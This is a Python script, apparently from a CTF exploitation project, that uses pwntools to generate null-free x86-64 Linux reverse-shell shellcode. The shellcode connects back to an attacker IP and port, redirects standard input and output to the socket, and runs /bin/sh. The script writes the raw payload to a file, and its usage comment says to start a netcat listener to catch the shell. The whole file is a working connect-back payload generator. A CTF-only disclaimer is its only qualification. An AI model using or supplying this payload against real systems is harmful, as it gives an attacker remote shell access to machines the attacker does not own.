#!/usr/bin/env python3
# src/scripts/gen_reverse_shell.py
# ---------------------------------------------------------------------------
# Generate a null-free x86-64 reverse-shell (connect-back) payload for a given
# IP/port using pwntools shellcraft.
#
# A reverse shell is inherently parameterised (attacker IP + port), so the
# null-free bytes are *generated* rather than hand-written -- hand-encoding a
# null-free sockaddr_in is error-prone. shellcraft emits null-free code by
# construction and is the idiomatic CTF approach.
#
# Usage:
#   python3 src/scripts/gen_reverse_shell.py 127.0.0.1 1337 -o bin/reverse_shell.bin
# Then run a listener (e.g. `nc -lvp 1337`) before the payload executes.
# Educational / CTF use only.
# ---------------------------------------------------------------------------
import argparse
import sys

from pwn import asm, context, shellcraft


def generate(ip: str, port: int) -> bytes:
    """Null-free x86-64 connect-back shellcode: connect -> dup2 -> execve sh."""
    context.clear(arch="amd64", os="linux")
    sc = shellcraft.amd64.linux.connect(ip, port)   # socket() + connect()
    sc += shellcraft.amd64.linux.dupio()            # dup2 sockfd -> 0,1,2
    sc += shellcraft.amd64.linux.sh()               # execve("/bin/sh")
    return asm(sc)


def main() -> int:
    ap = argparse.ArgumentParser(description="Generate a null-free reverse shell")
    ap.add_argument("ip", nargs="?", default="127.0.0.1", help="attacker IP")
    ap.add_argument("port", type=int, nargs="?", default=1337, help="attacker port")
    ap.add_argument("-o", "--output", type=str, default=None,
                    help="write raw bytes to file")
    args = ap.parse_args()

    payload = generate(args.ip, args.port)
    print(f"[*] reverse shell -> {args.ip}:{args.port}")
    print(f"[*] length        : {len(payload)} bytes")
    print(f"[*] null bytes    : {payload.count(0)}")
    if args.output:
        with open(args.output, "wb") as fh:
            fh.write(payload)
        print(f"[*] wrote         : {args.output}")
    else:
        print(f"[*] bytes         : {payload!r}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
